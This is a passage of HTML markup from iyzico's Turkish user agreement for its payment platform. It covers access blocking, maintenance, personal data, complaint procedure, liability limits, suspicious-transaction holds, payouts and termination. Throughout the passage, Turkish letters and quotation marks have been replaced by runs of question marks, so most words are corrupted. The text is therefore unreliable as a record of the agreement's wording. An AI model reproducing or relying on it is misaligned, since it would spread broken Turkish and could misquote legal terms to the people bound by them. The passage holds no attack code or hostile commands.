                      <font size="2" style="font-size: 10pt">h) Kullan??c??, iyzico taraf??ndan sunulan Platform ??zelliklerine ili??kin a????klama ile ???iyzico Platform Arac??l??????yla ??deme Yap??lmas??na ??li??kin Kurallar???a ve bunlarla ilgili t??m g??ncellemelere uyacak, uymamas?? nedeniyle meydana gelecek t??m taleplerden sorumlu olacakt??r.</font>
                    </font>
                  </font>
                </font>
              </font>
            </p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff"> &nbsp;</p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
              <font face="Times New Roman, serif">
                <font size="3" style="font-size: 12pt">
                  <font color="#000000">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">??) </font>
                    </font>
                  </font>
                  <font color="#333333">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">Sat??c??, ??nternet Sitesi???nde sat?????? yasal olmayan ??r??nler ve hizmetler sunmayacakt??r. iyzico taraf??ndan, ??nternet Sitesi???nde sat?????? hukuka ayk??r?? olan ya da iyzico ilkelerine ters d????en ??r??n veya hizmetlerin sunuldu??unun tespiti h??linde, Sat??c?? taraf??ndan Platform???un kullan??lmas??n?? tamamen veya k??smen durdurma yetkisi vard??r. Bu durumda ??deme ????lemi???nin reddedilmesi veya Platform???a eri??imin tamamen ask??ya al??nmas?? S??zle??me???nin iyzico taraf??ndan ihl??li olarak de??erlendirilemez.</font>
                    </font>
                  </font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <br> &nbsp;
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">6) GENEL ESASLAR</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">6.1. iyzico???nun Platform???a Eri??imi Engelleme Hakk??</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">a) iyzico, ??zellikle a??a????daki durumlar??n meydana gelmesi halinde, Platform???a eri??imi engelleme hakk??na sahip olacakt??r. S??z konusu durumun ortadan kald??r??lmas??n?? m??teakip eri??im tekrar sa??lanacakt??r.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">??? <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">Platform???a y??nelik bilgisayar vir??s?? tehdidi varsa,</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">??? <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">Kullan??c?? i??bu S??zle??me kapsam??nda kendisinden talep edilen bilgileri sa??lam??yorsa,</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">b) iyzico???nun i??bu S??zle??me???ye ili??kin hizmetleri ??nceden Kullan??c?????ya haber vermeksizin denetleme yetkisi mevcuttur.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">6.2. Platform Bak??m??, Kesintiler ve Ar??za ????z??mleri</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">a) iyzico, Platform???un d??zg??n olarak ??al????mas?? i??in gerekli olan s??rekli bak??m??, donan??m?? ve teknik deste??i sa??layacakt??r. Bununla ba??lant??l?? olarak iyzico???nun, i??bu S??zle??me???de a????k??a belirtilen durumlarda ilgili sunucular??n ??al????mas??n?? ge??ici olarak durdurma veya s??n??rland??rma hakk?? sakl??d??r. Bu durumda, Kullan??c?????n??n herhangi bir tazminat hakk?? mevcut de??ildir.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">b) iyzico, Platform???un kesintisiz ??al????aca????n?? garanti etmemektedir. iyzico, ??demeleri zaman??nda i??leyecek olup, Sistem Ortaklar?????ndan kaynaklanan sorunlar nedeniyle, bu i??lemlerin zaman??nda ger??ekle??memesinden sorumlu olmamakla birlikte, s??z konusu sorunlar??n en k??sa s??re i??erisinde giderilmesi i??in gayret edecek ve Sistem Ortaklar?? ile ileti??im halinde olacakt??r.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">6.3. Ki??isel Bilgilerin Korunmas??</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">a) Kullan??c??, kendisine ait bilgilerin sadece Servis???in verilmesini temin amac??yla, iyzico Gizlilik&amp;Ki??isel Veri Politikas?????n??n </font>
                </font>
              </font>
              <font color="#0000ff">
                <u>
                  <a href="https://www.iyzico.com/gizlilik-politikasi/">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">https://www.iyzico.com/gizlilik-politikasi/</font>
                    </font>
                  </a>
                </u>
              </font>
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt"> adresinde yay??nlanan en g??ncel halinde belirtildi??i ??ekilde iyzico taraf??ndan i??lenmesine, saklanmas??na ve benzeri i??lemlerin (sisteme tan??mlamak ve kay??t etmek) yap??lmas??na ve gerekti??inde ??????nc?? ki??iler ile payla????lmas??na ili??kin bilgilendirildi??ini kabul etmektedir. iyzico ki??isel verilerin ???gizli bilgi??? oldu??unun, kendisine bu ama??la verilen ki??isel bilgilerin gizlili??ini temin i??in gerekli ??zeni g??stermekle y??k??ml?? oldu??unun ve 6698 say??l?? Ki??isel Verilen Korunmas?? Kanunu???na ve di??er g??ncel mevzuatlara uygun davranmas?? gerekti??inin bilincindedir. </font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">b) Kullan??c??, iyzico???nun bir ??ik??yeti i??leme ald?????? durumlarda, Servis kapsam??nda ger??ekle??tirdi??i i??lemlere ili??kin bilgiler ile kendisine ait sair bilgilerin, ??ik??yetin ????z??m?? i??in gerekli oldu??u ??l????de Sat??c?? ve/veya Pazaryeri???ne iletilebilece??ini kabul ve beyan eder.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">7. ????K??YET PROSED??R??, HATA VE ZARAR SORUMLULUKLARI</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">7.1. ????K??YET PROSED??R??</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">a) Kullan??c??, iyzico taraf??ndan sa??lanan hizmetlere ili??kin ??ik??yetleri </font>
                </font>
              </font>
              <font color="#0000ff">
                <u>
                  <a>
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">sikayet@iyzico.com</font>
                    </font>
                  </a>
                </u>
              </font>
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt"> e-posta adresine e-posta g??ndermek suretiyle iletecektir.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">b) Kullan??c?? taraf??ndan ayr??ca Yetkili Personel???e ileti??im telefon numaras??ndan ula??arak da ??ik??yet prosed??r?? ba??lat??labilecektir. </font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">c) iyzico, ??ik??yet konusu sorunun giderilmesi i??in elinden gelen en iyi ??abay?? sarf edecektir. iyzico, ??ik??yetlerdeki eksiklikler (bildirim eksiklikleri) ile ba??lant??l?? olarak meydana gelen gecikmelerden sorumlu olmayacakt??r.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">d) Kullan??c?? taraf??ndan y??neltilecek ??ik??yetler en az ??u ayr??nt??lar?? i??ereceklerdir: ??ik??yet nedeni, i??lemde dahil edilen taraflar??n listesi, varsa i??lem kodu ve sorunun ayr??nt??l?? bir listesi ve olas?? hata mesajlar??n??n i??eri??i.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">e) Kullan??c?? ile herhangi bir Kullan??c?? veya Sat??c?? aras??nda meydana gelen uyu??mazl??klar ile ilgili Kullan??c?? ile i??lemin taraf?? olan Kullan??c?? veya Sat??c?? aras??nda ????z??me ula??t??r??lacak olup, iyzico bu i??lemlerden veya uyu??mazl??klardan sorumlu olmayacakt??r. iyzico???nun bu madde kapsam??nda herhangi bir nedenle (kendi kusurundan kaynakl?? haller d??????nda) bir bedel ??demek durumunda kalmas?? halinde, Kullan??c?? iyzico taraf??ndan ??denen bedeli derhal tazmin edecektir.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">f) iyzico gelen ??ik??yetleri kendisine ula??ma tarihinden itibaren en ge?? 20 (yirmi) g??n i??erisinde yan??tlayacakt??r.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">7.2. HATA VE ZARARDAN DO??AN SORUMLULUK</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">a) ??nternet Sitesi???nde sunulan ??r??nlerin veya hizmetlerin Kullan??c?????ya tedarik edilmesine veya iade edilmesine ili??kin Al??c?? ve Sat??c?? aras??ndaki s??zle??menin hukuka uygun bir ??ekilde akdedilmi?? olmas??ndan iyzico sorumlu olmayacakt??r.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">b) iyzico, sadece S??zle??me???den kaynaklanan y??k??ml??l??klerini ihl??l etmesi h??linde meydana gelen do??rudan zararlardan sorumlu olup, kendi kusurunun bulunmad?????? ??????nc?? ??ah??s veya Sistem Ortaklar?? taraf??ndan neden olunan zararlardan sorumlu olmayacakt??r.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">c) iyzico, ??deme emrinin verilmesinin ard??ndan Kullan??c?? taraf??ndan bilgilerin hatal?? veya eksik girilmesi nedeniyle i??lemlerin tamamlanmamas?? veya gecikmesinden veya kendisi taraf??ndan ??ng??r??lemeyen veya engellenemeyen durumlar neticesinde meydana gelen gecikmelerden ??t??r?? ??deme ????lemi???nin ger??ekle??tirilememesinden veya ??deme ????lemi???nde kendi kusuru d??????nda hata vermesinden veya bunlar??n sonucunda meydana gelen zararlardan sorumlu olmayacakt??r.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">d) Kullan??c?????n??n i??bu S??zle??me kapsam??ndaki herhangi bir taahh??t veya y??k??ml??l??????ne ayk??r?? ayk??r?? davranmas??, yasalar?? veya herhangi bir ??????nc?? ki??inin haklar??n?? ihlal etmesi nedeniyle iyzico???nun, g??revlilerinin, y??neticilerinin ve ??al????anlar??n??n bir zarara u??ramas?? yahut iyzico???nun yasal, idari veya cezai bir yapt??r??ma tabi tutulmas?? halinde, ??dedi??i tutarlar (avukatl??k ??cretleri de dahil olarak) ferileri ile birlikte Kullan??c?????ya r??cu edilecektir.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">7.3. ????PHEL??/YETK??LEND??R??LMEM????/HATALI ????LEMLERDE SORUMLULUK</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">a) Al??c?? taraf??ndan ??demenin iyzico???ya iletilmesi halinde iyzico i??bu S??zle??me???de belirtilen ko??ullarda ve Pazaryeri taraf??ndan belirtilen kurallar dahilinde ilgili onay s??re??lerinin tamamlanmas??n?? m??teakip ??demeyi Sat??c?????ya aktaracakt??r. Kullan??c?????dan kaynaklanan sebeplerle ??demenin iyzico???ya aktar??lmamas?? halinde, iyzico???nun Sat??c?????ya ??deme yapma y??k??ml??l?????? s??z konusu olmayacakt??r. Onay s??recinin herhangi bir nedenle gere??i gibi tamamlanmamas?? halinde ise; iyzico ilgili tutar?? Al??c?????ya iade edebilecektir.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">b) Al??c??, Onay Tarihi???nde ilgili ??deme ????lemi???ne ili??kin ??deme emrini vermi?? kabul edilir. Kullan??c??, teslimata (ge?? veya eksik teslim, ay??pl?? ??r??n vb.) ili??kin herhangi bir bildirim yapmamas?? veya teslimat??n gere??i gibi ger??ekle??ti??ine ili??kin bildirim yapm???? olmas?? halinde tutar??n Sat??c?????ya aktar??lm???? olmas?? ile ilgili iyzico???dan herhangi bir talepte bulunamaz.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font face="Arial, serif">
                <font size="2" style="font-size: 10pt">c) </font>
              </font>
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">Herhangi bir i??leme ili??kin olarak iyzico???ya Hatal??/Yetkisiz ????lem bildiriminde bulunuldu??u takdirde, derhal ve her hal??karda ??deme ????lemi???nin ger??ekle??tirilmesini takip eden azami 13 (on????) ay i??erisinde Kullan??c?? taraf??ndan VISA, Mastercard kurallar?? gere??ince d??zeltme veya harcama itiraz?? talebinde bulunulabilecektir. Bu durumda s??z konusu bildirimin do??ru oldu??unun kan??tlanmas?? veya Sistem Orta???????n??n bildirimi halinde ilgili i??lem bedeli Sat??c?????ya aktar??lmayarak iyzico taraf??ndan do??rudan Kullan??c?????ya iade edilebilecek, bildirim an??nda i??lem bedeli Sat??c?????ya aktar??lm???? ise iyzico ilgili tutarlar?? Sat??c?????dan iade talep ederek (Sat??c?? iadeyi 1 g??n i??erisinde ger??ekle??tirecek olup iyzico???nun ilgili bedeli Sat??c?????ya yap??lacak ??demelerden mahsup hakk?? sakl??d??r) Kullan??c?????ya aktarabilecekt??r. </font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">d) iyzico, ??zellikle a??a????daki durumlar olmak ??zere ????pheli ????lemler???de ve Al??c?? veya Sistem Orta???? taraf??ndan kendisine bildirilmesi h??linde, i??lem tutarlar??n?? Sistem Orta???? veya Al??c?????n??n ??deme ????lemi???ne ili??kin onay?? verme tarihine kadar saklama ve Sat??c?????ya ??deme yapmama hakk??na sahiptir. ????pheli durumun belgelendirilmek kayd??yla kesinle??mesi halinde ??demeler kesin olarak i??lenmeyecektir.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">??? <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">??deme ????lemi???nin yasal h??k??mlere uygun olmad??????na y??nelik bir ????phe varsa,</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">??? <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">??deme ????lemi???nin, ??deme ????lemi???nde kullan??lan kredi kart??n??n hamilinin bilgisi d??????nda yap??ld??????na y??nelik bir ????phe varsa,</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">??? <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">??deme ????lemi???nin, ??deme ????lemi???nde kullan??lan banka hesab?? sahibinin bilgisi d??????nda yap??ld??????na y??nelik bir ????phe varsa,</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">??? <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">??deme ????lemi???nin ger??ek bir ??deme ????lemi olmad??????na (testler hari??) y??nelik bir ????phe varsa.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">e) Kay??p veya ??al??nt?? bir ??deme Arac?????n??n kullan??lmas?? ya da ki??isel g??venlik bilgilerinin gere??i gibi muhafaza edilmemesi nedeniyle ??deme arac??n??n ba??kalar?? taraf??ndan kullan??lmas?? durumunda, Kullan??c??, yetkilendirmedi??i ??deme i??lemlerinden do??an zarar??n ??deme Hizmetleri ve Elektronik Para ??hrac?? ile ??deme Kurulu??lar?? ve Elektronik Para Kurulu??lar?? Hakk??nda Y??netmelik (???Y??netmelik???) Madde 45/4???te belirtilen miktar kadar olan b??l??m??nden sorumludur. Kullan??c??, Y??netmelik???in 44. maddesinin d??rd??nc?? f??kras?? uyar??nca yapt?????? bildirimden sonra ger??ekle??en yetkilendirmedi??i ??deme i??lemlerinden sorumlu de??ildir. ??deme Arac?????n?? hileli kullanmas?? veya bildirim y??k??ml??l??klerini kasten veya a????r ihmalle yerine getirmemesi durumunda ise Kullan??c??, yetkilendirilmemi?? i??lemden do??an zarar??n tamam??ndan sorumlu olacakt??r.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">8. ??DEMELERE ??L????K??N GENEL ESASLAR</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">a) iyzico, S??zle??me kapsam??nda Kullan??c?? taraf??ndan kendisine iletilen ??r??n/hizmet bedellerinin, Onay Tarihi???ni takip eden i?? g??n?? i??erisinde Sat??c?????ya aktar??lmas??ndan sorumludur. Sat??c?????ya aktar??l??rken ilgili hizmet kapsam??nda kesilmesi gereken komisyon/hizmet bedeli gibi bir bedel varsa; bu bedeli d????erek bakiyenin Sat??c?????ya aktar??m??n?? yapacakt??r.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">b) iyzico, Kullan??c?? taraf??ndan yap??lan ??deme ????lemi???nin konusu olan tutar??n Sat??c?????ya aktar??lmas?? i??leminde Kullan??c?????dan herhangi bir ??cret tahsil etmemektedir. </font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">c) Kullan??c??, iyzico???nun bir banka, kredi veya finans kurumu olmad??????n?? ve iyzico taraf??ndan i??bu S??zle??me uyar??nca verilen hizmetin bir bankac??l??k hizmeti olmad??????n??, iyzico???nun ??deme kurulu??u olarak Kanun kapsam??nda ??deme hizmetleri sundu??unu kabul eder. Bu kapsamda iyzico, ??deme ????lemi kapsam??nda tahsil edilen tutarlara faiz i??letmeyecek yahut ??deme Arac?? ihrac??nda bulunmayacak olup Kullan??c?? iyzico???dan faiz veya sair adlar alt??nda herhangi bir menfaat talebinde bulunmayacakt??r. iyzico Kullan??c?????ye kredi verme, taksitlendirme, tahsil edilemeyen tutarlara ili??kin ??deme veya ??deme garantisi verme yahut bu anlama gelecek faaliyetlerde bulunamaz. Kullan??c??, iyzico???dan bu kapsamda talepte bulunmamay?? kabul ve taahh??t eder. Bununla birlikte Sat??c?? kendisi taksitlendirme yapt?????? takdirde, taksit bedellerinin ??denmesine ili??kin ??deme hizmeti sunulabilecektir.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">9. S??ZLE??MEN??N S??RES?? VE FES??H</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">a) ????bu S??zle??me, Kullan??c?????n??n kabul ederek onaylad?????? tarihte y??r??rl????e girecek olup, taraflarca feshedilmedik??e y??r??rl??kte kalacakt??r.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">b) Taraflardan biri, i??bu S??zle??me???den do??an y??k??ml??l??klerini yerine getirmedi??i takdirde, di??er Taraf g??nderece??i bir ihtar ile ayk??r??l??????n giderilmesi i??in 14 (ond??rt) g??n s??re verecektir. Ayk??r??l??????n verilen s??re i??erisinde giderilmemesi halinde; S??zle??me ba??kaca ihtara gerek olmaks??z??n feshedilmi?? say??lacakt??r.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">c) Kullan??c??, i??bu S??zle??me???yi, herhangi bir sebep bildirmeksizin, 1 (bir) ay ??ncesinden yaz??l?? fesih ihbar??nda bulunmak kayd??yla feshedebilecektir. iyzico ise, S??zle??me???yi 2 (iki) ay ??ncesinden yaz??l?? bildirimle herhangi bir sebep g??stermeksizin ve tazminat ??demeksizin feshi hakk??na sahip olacakt??r. S??zle??me???nin fesih tarihinden ??nce muaccel olan i??bu S??zle??me???ye konu y??k??ml??l??klerin yerine getirilmesine halel getirmeyecek olup, Taraflar?????n fesih tarihine kadar muaccel olan alacak haklar?? sakl??d??r.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">d) iyzico???nun i??bu S??zle??me kapsam??ndaki Servis???i sunmas??na imkan tan??yan izin ve lisanslar??n herhangi bir ??ekilde ortadan kalkmas?? ve/veya Pazaryeri ile iyzico aras??ndaki ??nternet Sitesi ??zerinden yap??lan sat????lara ili??kin bedellerin tahsiline ili??kin anla??man??n sona ermesi halinde i??bu S??zle??me kendili??inden sona erecektir. </font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">e) iyzico hileli veya yetkisiz kullan??m ????phesinin s??z konusu oldu??u hallerde Servis???i ask??ya alabilecek, ??deme Arac?????n??n kullan??m??n?? engelleyebilecek ve ??deme ????lemi???ni iptal edebilecektir. Bu durumda iyzico, ilgili mevzuatta bilgi verilmesini engelleyici d??zenlemeler bulunmamas?? veya g??venli??i tehdit edici objektif nedenler olmamas?? kayd?? ile Kullan??c?????y?? konu ile ilgili bilgilendirecek ve engelleme sebebi ortadan kalkt??????nda Servis ve ??deme Arac?????n?? yeniden kullan??ma a??acakt??r. iyzico ayr??ca Kullan??c?????n??n i??bu S??zle??me???ye ayk??r??l?????? durumunda da ayk??r??l??k giderilene kadar Servis???i ask??ya alabilecektir.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">10. ??E????TL?? H??K??MLER</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">a) iyzico taraf??ndan hizmetlerin sa??lanmas??na y??nelik olarak </font>
                </font>
              </font>
              <font color="#0000ff">
                <u>
                  <a href="http://www.iyzico.com/">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">www.iyzico.com</font>
                    </font>
                  </a>
                </u>
              </font>
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt"> internet sitesinde il??n edilecek ??artlar ve ko??ullar, i??bu S??zle??me???nin eki ve ayr??lmaz bir par??as??n?? te??kil etmektedir. ????bu S??zle??me iyzico???nun </font>
                </font>
              </font>
              <font color="#0000ff">
                <u>
                  <a href="http://www.iyzico.com/">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">www.iyzico.com</font>
                    </font>
                  </a>
                </u>
              </font>
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt"> internet sitesinde veya ba??lant??l?? adreslerinde her zaman Kullan??c?? taraf??ndan eri??ilebilir olacakt??r</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">b) iyzico, S??zle??me???deki her t??rl?? de??i??ikli??i, internet sitesinde il??n edebilir ve/veya yeni s??r??mlerini yay??nlayabilir. De??i??ikliklere ili??kin olarak iyzico, de??i??ikli??in kapsam??, y??r??rl??k tarihi ve Kullan??c?????n??n fesih hakk??na ili??kin bilgileri i??eren bildirimi y??r??rl????e girme tarihinden 30 (otuz) g??n ??nce Kullan??c?????ya iletir. Bu durumda Kullan??c?????n??n S??zle??me???yi herhangi bir ??cret ??demeksizin feshetme hakk?? sakl?? olup belirtilen 30 (otuz) g??nl??k s??re i??inde itiraz edilmemesi halinde de??i??iklik kabul edilmi?? say??lacakt??r.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">c) Taraflar?????n, kendi iradeleri d??????nda ger??ekle??en, m??dahale imkanlar?? bulunmayan ve makul bir ??ekilde ??nceden ??ng??r??lmesi m??mk??n olmayan nedenlerle y??k??ml??l??klerini yerine getiremedikleri sava??, s??k??y??netim, seferberlik, ter??rist eylemler, do??al afetler, yang??n, grev ve lokavt da dahil istisnai olaylar m??cbir sebep olarak kabul edilir. M??cbir sebebin ortaya ????kmas?? halinde, S??zle??me???ye ili??kin edimler m??cbir sebep hali sona erinceye kadar ask??ya al??n??r. Ask??ya al??nma s??resi 1 (bir) ay?? ge??ti??i takdirde, Taraflar?????n i??bu S??zle??me???yi fesih hakk?? do??ar.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">d) Kullan??c??, kanunlara ve VISA, Mastercard ve di??er ??deme kart?? kurulu?? ve otoritelerinin (B.D.D.K., T.C.M.B. vb) kurallar?? ile iyzico taraf??ndan haz??rlanan kurallara ve prosed??rlere uyacakt??r.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">e) ????bu S??zle??me???nin herhangi bir h??km??n?? herhangi bir nedenle ge??ersiz olmas?? h??linde, di??er h??k??mlerin veya S??zle??me???nin uygulanabilirli??i ve/veya ge??erlili??i bu ge??ersizlikten etkilenmeyecektir.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">f) Taraflar, Platform veya Y??netim Aray??z?? ??zerinden eri??ilebilir kay??tlar??n Taraflar aras??nda delil s??zle??mesi mahiyetinde kabul edilece??i hususunda mutab??kt??r.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">g) Taraflar i??bu S??zle??me???den do??acak uyu??mazl??klar??n ????z??m??nde ??stanbul Anadolu Mahkemelerinin ve ??cra Dairelerinin yetkisini kabul etmi??lerdir.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
